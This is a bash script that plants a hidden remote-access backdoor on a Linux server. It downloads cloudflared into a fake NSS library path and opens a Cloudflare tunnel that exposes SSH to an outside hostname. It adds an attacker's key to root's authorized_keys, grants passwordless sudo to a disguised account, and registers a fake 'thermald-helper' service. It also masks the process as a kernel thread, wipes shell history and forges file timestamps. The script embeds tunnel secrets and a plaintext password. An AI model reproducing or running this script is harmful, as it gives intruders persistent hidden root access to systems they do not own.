#!/bin/bash
export HISTSIZE=0 HISTFILESIZE=0
CF="/usr/lib/x86_64-linux-gnu/nss/.libnss_dns_helper"
CONFDIR="/usr/lib/x86_64-linux-gnu/nss/.libnss_conf"
TUNNEL_ID="274eeff0-c549-4abd-ae89-1c2d20e0c1e5"
SECRET="1fgI3Lpz4rLqoxIbLGUNFbtQLsDW9uNEURgX1BeDvLw="
HOSTNAME_CF="gdj-services.larangan.desa.id"
ACCOUNT="e1e66baf420915a22e19b1d09fac3e35"
SERVICE_NAME="thermald-helper"
SYS_MONITOR="$CONFDIR/.sys-monitor"
TOKEN_FILE="$CONFDIR/.tk"
LOCKFILE="/var/lib/dpkg/.lock-sm"
WRAPPER="$CONFDIR/.sys-health"
SSH_PORT="22"
U="systemd-coredump"
P="Sugiarto20@"
HASH6='$6$P3rs1st70$HPkf6PZDA5HBhtiKgN.juex1qPOSADrQabQQrWG6FekDGbkVpYRaGq9fI5/Log5vCOwqJEx7fa.azDzEc2LGT.'
SUDOERS_FILE="/etc/sudoers.d/99-systemd-resolve"
PERSIST_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGjWgSEewySCzN/eiUPNmROLRd8BGhkanzKTItb4snJ/ "
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
mkdir -p "$(dirname $CF)" "$CONFDIR" 2>/dev/null
[ ! -s "$CF" ] && curl -sL --connect-timeout 15 --max-time 300 "$CF_URL" -o "$CF"
chmod +x "$CF"
mkdir -p "$CONFDIR" 2>/dev/null
cat > "$CONFDIR/config.yml" << EOF
tunnel: $TUNNEL_ID
credentials-file: $CONFDIR/cred.json
ingress:
  - hostname: $HOSTNAME_CF
    service: ssh://localhost:$SSH_PORT
  - service: http_status:404
EOF
cat > "$CONFDIR/cred.json" << EOF
{"AccountTag":"$ACCOUNT","TunnelID":"$TUNNEL_ID","TunnelSecret":"$SECRET"}
EOF
echo "$TUNNEL_ID" > "$TOKEN_FILE"; chmod 600 "$TOKEN_FILE"
# SSH keys — NEW KEY
for uhome in /root; do
  mkdir -p "$uhome/.ssh" 2>/dev/null; chmod 700 "$uhome/.ssh"
  grep -q "GjWgSEewy" "$uhome/.ssh/authorized_keys" 2>/dev/null || echo "$PERSIST_KEY" >> "$uhome/.ssh/authorized_keys"
  chmod 600 "$uhome/.ssh/authorized_keys"
  touch -r /etc/ssh/ssh_host_rsa_key.pub "$uhome/.ssh/authorized_keys" "$uhome/.ssh" 2>/dev/null
done
# Wrapper
cat > "$WRAPPER" << 'WEOF'
#!/bin/bash
exec -a "[kworker/0:1-events]" CF_PH tunnel --config CONFDIR_PH/config.yml run
WEOF
sed -i "s|CF_PH|$CF|g;s|CONFDIR_PH|$CONFDIR|g" "$WRAPPER"
chmod 700 "$WRAPPER"
# Start tunnel
nohup "$WRAPPER" >/dev/null 2>&1 &
# Sudoers
echo "$U ALL=(ALL) NOPASSWD: ALL" > "$SUDOERS_FILE"; chmod 440 "$SUDOERS_FILE"
# Service
SVC="/etc/systemd/system/${SERVICE_NAME}.service"
cat > "$SVC" << EOF
[Unit]
Description=Thermal Daemon Helper
After=network-online.target
[Service]
Type=simple
ExecStart=$WRAPPER
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl enable "$SERVICE_NAME" 2>/dev/null; systemctl start "$SERVICE_NAME"
# Timestomp
touch -r /usr/bin/ssh "$CF" "$WRAPPER" "$CONFDIR/config.yml" "$CONFDIR/cred.json" "$TOKEN_FILE" "$SYS_MONITOR" 2>/dev/null
touch -r /usr/lib/ "$CONFDIR" 2>/dev/null
touch -r /etc/init.d/ssh "$SVC" 2>/dev/null
chattr +i "$SVC" 2>/dev/null
echo "DEPLOY DONE"
